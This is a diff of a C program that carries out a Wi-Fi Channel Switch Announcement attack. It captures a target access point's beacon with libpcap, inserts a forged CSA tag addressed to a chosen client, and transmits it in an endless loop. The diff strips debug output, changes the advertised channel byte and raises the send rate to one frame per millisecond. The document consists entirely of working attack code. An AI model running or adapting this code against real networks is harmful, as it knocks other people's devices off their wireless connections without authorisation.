@@ -46,12 +46,12 @@ int csa_attack(const char* interface, const char* ap_mac_str, const char* sta_ma
 		return -1;
 	}
 
-
     // 1. ap_mac에 해당하는 beacon frame을 캡처한다.
     puts("capturing beacon frame...");
     unsigned char* captured_frame;
     int cap_len = capture_beacon(handle, &captured_frame, interface, ap_mac);
-    if (cap_len == ERROR_BEACON_CAPTURE) return -1;
+    if (cap_len == ERROR_BEACON_CAPTURE)
+        return -1;
 
     puts("success to capture beacon frame.");
     printf("cap_len: %d\n", cap_len);
@@ -92,14 +92,6 @@ void parse_mac(unsigned char* mac_arr, const char* mac_str) {
 
 int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interface, const char* ap_mac) {
 
-    // char errbuf[PCAP_ERRBUF_SIZE];
-    // pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
-    // // pcap_t* handle = pcap_open_offline(interface, errbuf);
-    // if (handle == NULL) {
-    //     fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
-	// 	return -1;
-	// }
-
     struct pcap_pkthdr* header;
 	const unsigned char* packet;
     while (1){
@@ -112,13 +104,6 @@ int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interf
 
         RadiotapHeader* r_hdr = packet;
         Dot11FrameHeader* frame_hdr = packet + r_hdr->length;
-        // printf("%02x\n", r_hdr->present);
-        // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)r_hdr)[i]);
-        // putchar('\n');
-        // if (ntohs(frame_hdr->frame_ctl) == 0x8000) {
-        //     printf("captured addr1: %02x\n", frame_hdr->addr1);
-        //     printf("captured addr2: %02x\n", frame_hdr->addr2);
-        // }
         
         if((ntohs(frame_hdr->frame_ctl) == 0x8000) && (strncmp(frame_hdr->addr2, ap_mac, 6) == 0)) {
             *cap_frame = calloc(header->caplen, 1);
@@ -128,7 +113,6 @@ int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interf
 
     } // while (1)
 
-    // pcap_close(handle);
     return header->caplen;
 
 }
@@ -137,10 +121,7 @@ int capture_beacon(pcap_t* handle, unsigned char** cap_frame, const char* interf
 void generate_csa(unsigned char** dst, unsigned char* frame, int pkt_len, const char* ap_mac, const char* dst_mac) {
 
     RadiotapHeader* r_hdr = frame;
-    // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)r_hdr)[i]);
-    // putchar('\n');
     memcpy(*dst, r_hdr, r_hdr->length);
-    // for(int i=0; i<r_hdr->length; i++) printf("%02x ", ((unsigned char*)*dst)[i]);
 
     BeaconFrame* b_frame = frame + r_hdr->length;
     memcpy(b_frame->f_hdr.addr1, dst_mac, 6);
@@ -170,7 +151,7 @@ void generate_csa(unsigned char** dst, unsigned char* frame, int pkt_len, const 
             }
             else {
                 // printf("param tag num: %d\n", param->tag_num);
-                uint8_t csa_param[5] = {0x25, 0x03, 0x01, 0x13, 0x03}; // csa tag parameter byte
+                uint8_t csa_param[5] = {0x25, 0x03, 0x01, 0x1e, 0x03}; // csa tag parameter byte
                 memcpy((unsigned char*)param+5, (unsigned char*)param, (frame + pkt_len) - (unsigned char*)param);
                 memcpy(param, csa_param, 5);
                 set_csa = 1;
@@ -186,16 +167,10 @@ void generate_csa(unsigned char** dst, unsigned char* frame, int pkt_len, const 
 
 
 void send_csa(pcap_t* handle, const char* interface, unsigned char* frame, int len) {
-
-    puts("start of send_csa()");
-
     while (1) {
-        puts("before sendpacket()");
         pcap_sendpacket(handle, frame, len);
-        puts("after sendpacket()");
-        puts("send csa beacon frame");
-        // usleep(1000);
-        sleep(1);
+        usleep(1000);
+        // sleep(1);
     }
 
 }
